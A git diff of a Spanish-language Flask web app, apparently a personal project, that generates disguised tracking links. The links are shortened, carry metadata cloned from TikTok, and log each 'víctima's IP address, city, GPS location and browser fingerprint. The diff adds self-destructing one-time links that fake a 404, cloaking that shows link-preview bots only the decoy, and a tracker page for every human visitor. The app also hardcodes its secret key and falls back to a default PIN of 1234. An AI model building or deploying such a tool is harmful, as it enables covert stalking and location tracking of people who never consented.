@@ -9,52 +9,65 @@ import psycopg2
 
 app = Flask(__name__)
 
-# --- CONFIGURACIÓN DE SEGURIDAD CRÍTICA ---
-# Usamos una llave fija para que el servidor no olvide tu sesión al reiniciarse
+# ==========================================
+# 1. CONFIGURACIÓN DE SEGURIDAD Y VARIABLES
+# ==========================================
+
+# Llave secreta fija para evitar errores de sesión al reiniciar
 app.secret_key = "llave_maestra_segura_y_permanente_2025"
 
-# Tu contraseña de administrador
-# Intenta leerla de Railway, si no existe, usa '1234'
+# Tu PIN de Administrador (Leído de Railway o por defecto 1234)
 ADMIN_PIN = os.environ.get("ADMIN_PIN", "1234") 
 
+# URL de la Base de Datos (Proviesta por Railway)
 DATABASE_URL = os.environ.get("DATABASE_URL")
 
-# Configuración para engañar a TikTok (Web Scraping)
+# Cabeceras para engañar a los sistemas anti-robot de TikTok
 HEADERS_FALSOS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Accept-Language': 'es-ES,es;q=0.9',
 }
 
+# ==========================================
+# 2. CONEXIÓN Y GESTIÓN DE BASE DE DATOS
+# ==========================================
+
 def get_db_connection():
-    if not DATABASE_URL: return None
+    """Establece conexión con PostgreSQL"""
+    if not DATABASE_URL:
+        return None
     try:
         conn = psycopg2.connect(DATABASE_URL)
         return conn
     except Exception as e:
-        print(f"Error conectando DB: {e}")
+        print(f"Error conectando a la DB: {e}")
         return None
 
-# --- INICIALIZACIÓN DE BASE DE DATOS ---
 def inicializar_db():
+    """Crea las tablas iniciales si no existen al arrancar"""
     try:
         conn = get_db_connection()
-        if conn is None: return
+        if conn is None:
+            return
         cur = conn.cursor()
         
-        # Tabla de Trampas
+        # Tabla de Trampas (Los links que generas)
         cur.execute("""
             CREATE TABLE IF NOT EXISTS trampas (
                 id SERIAL PRIMARY KEY,
                 token VARCHAR(50) UNIQUE NOT NULL,
                 nombre VARCHAR(100),
                 url_destino TEXT,
-                meta_titulo TEXT, meta_desc TEXT, meta_img TEXT,
+                meta_titulo TEXT,
+                meta_desc TEXT,
+                meta_img TEXT,
                 usar_gps BOOLEAN DEFAULT FALSE,
+                one_time BOOLEAN DEFAULT FALSE,
                 created_at TIMESTAMP DEFAULT NOW()
             );
         """)
         
-        # Tabla de Intrusos
+        # Tabla de Intrusos (Las víctimas que caen)
         cur.execute("""
             CREATE TABLE IF NOT EXISTS intrusos (
                 id SERIAL PRIMARY KEY,
@@ -62,39 +75,65 @@ def inicializar_db():
                 ip_address VARCHAR(45),
                 user_agent TEXT,
                 city VARCHAR(100),
-                lat TEXT, lon TEXT, accuracy TEXT,
+                lat TEXT,
+                lon TEXT,
+                accuracy TEXT,
+                fingerprint TEXT,
                 captured_at TIMESTAMP DEFAULT NOW()
             );
         """)
         conn.commit()
         cur.close()
         conn.close()
-    except Exception as e: print(f"Error DB Init: {e}")
+    except Exception as e:
+        print(f"Error en inicialización de DB: {e}")
 
 @app.route('/update_db_schema')
 def update_db_schema():
-    # Protegido: Solo si está logueado
-    if not session.get('logged_in'): return redirect('/login')
+    """Ruta de Mantenimiento: Agrega columnas nuevas si actualizamos el código"""
+    # Protección: Solo si está logueado
+    if not session.get('logged_in'):
+        return redirect('/login')
+        
     try:
         conn = get_db_connection()
         cur = conn.cursor()
+        
+        # Actualizaciones V3 (GPS)
         cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS usar_gps BOOLEAN DEFAULT FALSE;")
         cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lat TEXT;")
         cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lon TEXT;")
         cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS accuracy TEXT;")
+        
+        # Actualizaciones V4 (Disfraz Personalizado)
+        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS url_destino TEXT;")
+        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS meta_titulo TEXT;")
+        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS meta_desc TEXT;")
+        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS meta_img TEXT;")
+        
+        # Actualizaciones V7 (Autodestrucción y Rayos X)
+        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS one_time BOOLEAN DEFAULT FALSE;")
+        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS fingerprint TEXT;")
+        
         conn.commit()
         cur.close()
         conn.close()
-        return "<h1>✅ Base de Datos Actualizada</h1>"
-    except Exception as e: return f"❌ Error: {e}"
+        return "<h1>✅ Base de Datos Actualizada: Todas las funciones listas.</h1>"
+    except Exception as e:
+        return f"❌ Error actualizando DB: {e}"
 
-# --- HERRAMIENTAS ---
+# ==========================================
+# 3. HERRAMIENTAS DE INTELIGENCIA
+# ==========================================
+
 def generar_token():
+    """Crea un código único aleatorio de 6 caracteres"""
     return ''.join(random.choices(string.ascii_letters + string.digits, k=6))
 
 def obtener_ubicacion(ip):
+    """Consulta la API de geolocalización para obtener Ciudad/País"""
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
+        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
         data = response.json()
         if data['status'] == 'success':
             return f"{data['city']}, {data['country']}"
@@ -104,9 +143,10 @@ def obtener_ubicacion(ip):
         return "Error Geo"
 
 def acortar_link(url_larga):
+    """Convierte el link de Railway en un link de is.gd"""
     try:
         api_url = f"https://is.gd/create.php?format=simple&url={url_larga}"
-        response = requests.get(api_url, timeout=4)
+        response = requests.get(api_url, timeout=5)
         if response.status_code == 200:
             return response.text.strip()
         return url_larga
@@ -114,24 +154,28 @@ def acortar_link(url_larga):
         return url_larga
 
 def clonar_metadatos(url_destino):
+    """Visita la web objetivo y roba el Título, Descripción e Imagen"""
+    print(f"🕵️‍♂️ Iniciando clonado de: {url_destino}")
     try:
-        response = requests.get(url_destino, headers=HEADERS_FALSOS, timeout=4)
+        response = requests.get(url_destino, headers=HEADERS_FALSOS, timeout=5)
         soup = BeautifulSoup(response.text, 'html.parser')
         
         t = soup.find("meta", property="og:title")
         d = soup.find("meta", property="og:description")
         i = soup.find("meta", property="og:image")
         
-        t_f = t["content"] if t else "Video Viral"
-        d_f = d["content"] if d else "Haz clic para ver"
-        i_f = i["content"] if i else "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png"
+        # Valores por defecto si falla el scraping
+        t_final = t["content"] if t else "Video Viral"
+        d_final = d["content"] if d else "Haz clic para ver el video completo."
+        i_final = i["content"] if i else "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png"
         
-        return t_f, d_f, i_f
-    except:
+        return t_final, d_final, i_final
+    except Exception as e:
+        print(f"Error en scraping: {e}")
         return "Video", "Ver video", ""
 
 # ==========================================
-# SISTEMA DE LOGIN (SEGURIDAD)
+# 4. SISTEMA DE LOGIN (SEGURIDAD)
 # ==========================================
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -141,16 +185,15 @@ def login():
             data = request.json
             pin_ingresado = data.get('pin')
             
-            # Verificación del PIN
+            # Verificación estricta del PIN
             if str(pin_ingresado) == str(ADMIN_PIN):
                 session['logged_in'] = True
-                session.permanent = False # Expira al cerrar navegador
+                session.permanent = False # La sesión muere al cerrar el navegador
                 return jsonify({"status": "ok"})
             else:
                 return jsonify({"status": "error", "mensaje": "PIN Incorrecto"}), 401
         except Exception as e:
-            print(f"Error Login: {e}")
-            return jsonify({"status": "error"}), 500
+            return jsonify({"status": "error", "mensaje": str(e)}), 500
             
     return render_template('login.html')
 
@@ -160,17 +203,19 @@ def logout():
     return redirect('/login')
 
 # ==========================================
-# RUTAS DEL DASHBOARD (PROTEGIDAS 🔒)
+# 5. RUTAS PRIVADAS (PANEL DE CONTROL)
 # ==========================================
 
 @app.route('/')
 def home():
-    if not session.get('logged_in'): return redirect('/login')
+    if not session.get('logged_in'):
+        return redirect('/login')
     return render_template('index.html')
 
 @app.route('/api/borrar_logs', methods=['POST'])
 def borrar_logs():
     if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
+    
     try:
         conn = get_db_connection()
         cur = conn.cursor()
@@ -188,29 +233,42 @@ def crear_trampa():
     
     try:
         d = request.json
-        n = d.get('nombre', 'Trampa')
-        u = d.get('url_destino', '')
-        gps = d.get('usar_gps', False)
-        mt = d.get('meta_titulo', '')
-        md = d.get('meta_desc', '')
-        mi = d.get('meta_img', '')
+        # Recuperamos los datos del formulario
+        nombre = d.get('nombre', 'Trampa')
+        url_destino = d.get('url_destino', '')
+        usar_gps = d.get('usar_gps', False)
+        one_time = d.get('one_time', False) # Nuevo campo V7
         
-        if not mt: mt, md, mi = clonar_metadatos(u)
+        meta_titulo = d.get('meta_titulo', '')
+        meta_desc = d.get('meta_desc', '')
+        meta_img = d.get('meta_img', '')
         
-        tok = generar_token()
+        # Si el usuario no puso metadatos manuales, intentamos clonarlos
+        if not meta_titulo:
+            meta_titulo, meta_desc, meta_img = clonar_metadatos(url_destino)
+        
+        token = generar_token()
+        
         conn = get_db_connection()
         cur = conn.cursor()
-        cur.execute(
-            "INSERT INTO trampas (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps) VALUES (%s, %s, %s, %s, %s, %s, %s)", 
-            (tok, n, u, mt, md, mi, gps)
-        )
+        cur.execute("""
+            INSERT INTO trampas 
+            (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps, one_time) 
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
+        """, (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps, one_time))
+        
         conn.commit()
         cur.close()
         conn.close()
         
-        link_final = acortar_link(f"{request.host_url}s/{tok}")
+        # Generamos el link corto final
+        link_railway = f"{request.host_url}s/{token}"
+        link_final = acortar_link(link_railway)
+        
         return jsonify({"status": "ok", "link": link_final})
+        
     except Exception as e:
+        print(f"Error creando trampa: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route('/api/ver_ataques', methods=['GET'])
@@ -220,10 +278,13 @@ def ver_ataques():
     try:
         conn = get_db_connection()
         cur = conn.cursor()
+        # Seleccionamos todos los datos, incluyendo el nuevo 'fingerprint'
         cur.execute("""
-            SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city, i.lat, i.lon
-            FROM intrusos i JOIN trampas t ON i.trampa_id = t.id
-            ORDER BY i.captured_at DESC LIMIT 50
+            SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city, i.lat, i.lon, i.fingerprint
+            FROM intrusos i 
+            JOIN trampas t ON i.trampa_id = t.id
+            ORDER BY i.captured_at DESC 
+            LIMIT 50
         """)
         ataques = cur.fetchall()
         cur.close()
@@ -231,54 +292,82 @@ def ver_ataques():
         
         resultado = []
         for a in ataques:
-            # Corrección horaria (GMT-5 Ecuador)
+            # Ajuste de hora para Ecuador (GMT-5)
             hora_ecu = a[2] - timedelta(hours=5)
             
             resultado.append({
                 "trampa": a[0],
                 "ip": a[1],
-                "hora": hora_ecu.strftime("%H:%M %d/%m"),
+                "hora": hora_ecu.strftime("%H:%M - %d/%m"),
                 "dispositivo": a[3],
                 "ubicacion": a[4] if a[4] else "Desconocida",
                 "lat": a[5],
-                "lon": a[6]
+                "lon": a[6],
+                "fingerprint": a[7] if a[7] else "" # Datos técnicos
             })
         return jsonify(resultado)
-    except: return jsonify([])
+    except Exception as e:
+        print(f"Error leyendo logs: {e}")
+        return jsonify([])
 
 # ==========================================
-# RUTAS PÚBLICAS (TRAMPAS) - ABIERTAS 🌍
+# 6. RUTAS PÚBLICAS (LA TRAMPA)
 # ==========================================
 
 @app.route('/s/<token>')
 def trampa_activada(token):
+    # 1. Recolección de datos iniciales (IP, User Agent)
     ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
+    if ip_victima and ',' in ip_victima:
+        ip_victima = ip_victima.split(',')[0].strip()
     user_agent = request.headers.get('User-Agent')
-    ubicacion = obtener_ubicacion(ip_victima)
     
     conn = get_db_connection()
     cur = conn.cursor()
-    cur.execute("SELECT id, url_destino, meta_titulo, meta_desc, meta_img, usar_gps FROM trampas WHERE token = %s", (token,))
-    trampa = cur.fetchone()
     
-    if not trampa: return redirect("https://google.com")
+    # Buscamos la trampa y sus configuraciones
+    cur.execute("""
+        SELECT id, url_destino, meta_titulo, meta_desc, meta_img, usar_gps, one_time 
+        FROM trampas WHERE token = %s
+    """, (token,))
+    res = cur.fetchone()
     
-    trampa_id, url_final, m_t, m_d, m_i, usar_gps = trampa
+    if not res:
+        return redirect("https://google.com")
     
-    # Detección de Bots
+    trampa_id, url_final, m_t, m_d, m_i, usar_gps, one_time = res
+    
+    # LÓGICA DE AUTODESTRUCCIÓN (V7)
+    if one_time:
+        # Contamos si ya hubo visitas reales (no bots)
+        cur.execute("SELECT count(*) FROM intrusos WHERE trampa_id = %s", (trampa_id,))
+        visitas = cur.fetchone()[0]
+        if visitas > 0:
+            # Si ya se usó, el link muere aquí.
+            cur.close()
+            conn.close()
+            return "<h1>404 Not Found</h1><p>Este enlace ha expirado o no existe.</p>", 404
+    
+    # Lógica de Geolocalización Básica
+    ubicacion = obtener_ubicacion(ip_victima)
+    
+    # Detección de Bots (WhatsApp, Telegram, Facebook)
+    # Si es un bot, NO guardamos el log y solo mostramos la imagen falsa
     ua_str = str(user_agent).lower()
-    es_bot = "facebook" in ua_str or "whatsapp" in ua_str or "telegram" in ua_str or "twitter" in ua_str
+    es_bot = any(x in ua_str for x in ['facebook', 'whatsapp', 'telegram', 'twitter', 'instagram'])
     
     if not es_bot:
-        cur.execute("INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)", 
-                   (trampa_id, ip_victima, user_agent, ubicacion))
+        # Guardamos el registro inicial (IP, Ciudad, User Agent)
+        cur.execute("""
+            INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) 
+            VALUES (%s, %s, %s, %s)
+        """, (trampa_id, ip_victima, user_agent, ubicacion))
         conn.commit()
     
     cur.close()
     conn.close()
 
-    # Si es un bot, mostramos el disfraz
+    # Si es bot, mostramos los metadatos falsos para la preview
     if es_bot:
         return f"""
         <!DOCTYPE html>
@@ -295,58 +384,50 @@ def trampa_activada(token):
         </html>
         """
 
-    # Si es humano y tiene GPS activado
-    if usar_gps:
-        return render_template('tracker.html')
-    else:
-        return redirect(url_final)
+    # Si es humano, decidimos a dónde enviarlo
+    # Siempre lo pasamos por 'tracker.html' para intentar sacar la Huella Digital (Fingerprint)
+    # aunque no pida GPS.
+    return render_template('tracker.html')
 
-@app.route('/api/save_gps', methods=['POST'])
-def save_gps():
-    data = request.json
-    token = data.get('token')
-    conn = get_db_connection()
-    cur = conn.cursor()
-    cur.execute("SELECT id FROM trampas WHERE token=%s", (token,))
-    res = cur.fetchone()
-    if res:
-        tid = res[0]
-        # Actualizamos el último registro
-        cur.execute("""
-            UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s 
-            WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)
-        """, (str(data['lat']), str(data['lon']), str(data['acc']), tid, tid))
-        conn.commit()
-    cur.close()
-    conn.close()
-    return jsonify({"status": "ok"})
-
-@app.route('/api/save_gps_bounce', methods=['GET'])
-def save_gps_bounce():
-    # Método de rebote para saltar bloqueos de navegador
-    t = request.args.get('token')
-    lat = request.args.get('lat')
-    lon = request.args.get('lon')
-    acc = request.args.get('acc')
-    
-    conn = get_db_connection()
-    cur = conn.cursor()
-    cur.execute("SELECT id, url_destino FROM trampas WHERE token = %s", (t,))
-    res = cur.fetchone()
-    
-    url_final = "https://tiktok.com"
-    if res:
-        tid, url_final = res[0], res[1]
-        cur.execute("""
-            UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s 
-            WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)
-        """, (lat, lon, acc, tid, tid))
-        conn.commit()
+# --- RUTA PARA GUARDAR DATOS AVANZADOS (GPS + FINGERPRINT) ---
+@app.route('/api/save_data', methods=['POST'])
+def save_data():
+    try:
+        data = request.json
+        token = data.get('token')
         
-    cur.close()
-    conn.close()
-    return redirect(url_final)
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        # Buscamos el ID de la trampa
+        cur.execute("SELECT id FROM trampas WHERE token = %s", (token,))
+        res = cur.fetchone()
+        
+        if res:
+            trampa_id = res[0]
+            # Actualizamos el ÚLTIMO registro insertado para esta trampa
+            # Agregamos Lat, Lon, Acc y Fingerprint
+            cur.execute("""
+                UPDATE intrusos 
+                SET lat=%s, lon=%s, accuracy=%s, fingerprint=%s
+                WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)
+            """, (
+                str(data.get('lat')), 
+                str(data.get('lon')), 
+                str(data.get('acc')), 
+                str(data.get('fingerprint')), 
+                trampa_id, trampa_id
+            ))
+            conn.commit()
+        
+        cur.close()
+        conn.close()
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        print(f"Error guardando datos avanzados: {e}")
+        return jsonify({"status": "error"}), 500
 
+# --- RUTA DE REDIRECCIÓN FINAL ---
 @app.route('/redirect/<token>')
 def redirect_final(token):
     conn = get_db_connection()
@@ -355,8 +436,11 @@ def redirect_final(token):
     res = cur.fetchone()
     cur.close()
     conn.close()
+    
+    # Si encontramos el destino, mandamos a la víctima allá
     return redirect(res[0] if res else "https://tiktok.com")
 
+# Arrancar la inicialización de DB al iniciar el script
 inicializar_db()
 
 if __name__ == '__main__':
